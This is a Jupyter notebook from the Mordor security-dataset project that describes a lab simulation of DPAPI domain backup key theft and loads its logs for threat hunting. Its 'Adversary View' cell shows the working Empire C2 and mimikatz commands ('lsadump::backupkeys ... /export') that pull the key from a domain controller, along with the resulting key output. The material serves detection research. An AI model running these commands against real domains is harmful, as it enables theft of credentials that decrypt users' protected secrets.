{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Mimikatz Backup Keys"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/21 |\n",
    "| Tactics           | ['[TA0006](https://attack.mitre.org/tactics/TA0006)'] |\n",
    "| Techniques        | ['[T1003](https://attack.mitre.org/techniques/T1003)'] |\n",
    "| Tags              | ['DPAPI', 'DPAPI Domain Backup key', 'RPC LSARPC'] |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries retrieving the DPAPI Domain Backup Key from the DC via RPC LSARPC methods over SMB."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/network/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/network/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|\n",
    "| Threat Hunter Playbook | Domain DPAPI Backup Key Extraction | [https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html](https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Mordor shire | C2 | [mimikatz_lsadump_backupkeys](https://github.com/OTRF/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: GCSKD17Z) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "GCSKD17Z ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         1112   5/0.0    2020-09-22 06:44:20  http            \n",
    "\n",
    "(Empire: agents) > interact GCSKD17Z\n",
    "(Empire: GCSKD17Z) > usemodule credentials/mimikatz/command\n",
    "(Empire: powershell/credentials/mimikatz/command) > set Command lsadump::backupkeys /system:MORDORDC.theshire.local /export\n",
    "(Empire: powershell/credentials/mimikatz/command) > execute\n",
    "[*] Tasked GCSKD17Z to run TASK_CMD_JOB\n",
    "[*] Agent GCSKD17Z tasked with task ID 9\n",
    "[*] Tasked agent GCSKD17Z to run module powershell/credentials/mimikatz/command\n",
    "(Empire: powershell/credentials/mimikatz/command) > \n",
    "Job started: WY91NL\n",
    "\n",
    "Hostname: WORKSTATION5.theshire.local / S-1-5-21-4228717743-1032521047-1810997296\n",
    "\n",
    "  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # lsadump::backupkeys /system:MORDORDC.theshire.local /export\n",
    "\n",
    "Current prefered key:       {b7638eb2-c641-40da-ac1c-f79d705bbc34}\n",
    "  * RSA key\n",
    "        |Provider name : Microsoft Strong Cryptographic Provider\n",
    "        |Unique name   : \n",
    "        |Implementation: CRYPT_IMPL_SOFTWARE ; \n",
    "        Algorithm      : CALG_RSA_KEYX\n",
    "        Key size       : 2048 (0x00000800)\n",
    "        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )\n",
    "        Exportable key : YES\n",
    "        Private export : OK - 'ntds_capi_0_b7638eb2-c641-40da-ac1c-f79d705bbc34.keyx.rsa.pvk'\n",
    "        PFX container  : OK - 'ntds_capi_0_b7638eb2-c641-40da-ac1c-f79d705bbc34.pfx'\n",
    "        Export         : OK - 'ntds_capi_0_b7638eb2-c641-40da-ac1c-f79d705bbc34.der'\n",
    "\n",
    "Compatibility prefered key: {74562e44-6689-4ede-9c63-1fc80a4efb16}\n",
    "  * Legacy key\n",
    "62120aa3174a8809ca95bd9369e8d5d062783e1c851c4cb4e9fd30db992a2a74\n",
    "7be846fe31ba50f4595afab3b487697dfaeec151652b27ea2fec86ac89903680\n",
    "1bacbf6392c94c986714efc09bbdd09b9bd0b4dfb8ccfb9a8eb946d8dbeb58d9\n",
    "38244dc055bd85b32b47fdc180baca8f69d8944b5ae000f2353a0f5ef96e0797\n",
    "4525d57e27895e40d495ab0956f3349a066069681943b426854e885393ddc871\n",
    "2d9a9d21f60f2929bdf0bf52131291dad835c512a537b98b2738483203c96334\n",
    "b79fc1f61ff6a92761eaee2a44f915f2514d8974e30ce8ef0d8f40038bbfd1b5\n",
    "1c89035623e2a66c9858ffcade5a3300f2fbc5678da7ae9011c328304e4f440d\n",
    "\n",
    "        Export         : OK - 'ntds_legacy_0_74562e44-6689-4ede-9c63-1fc80a4efb16.key'\n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/command) > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_backupkeys_dcerpc_smb_lsarpc.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
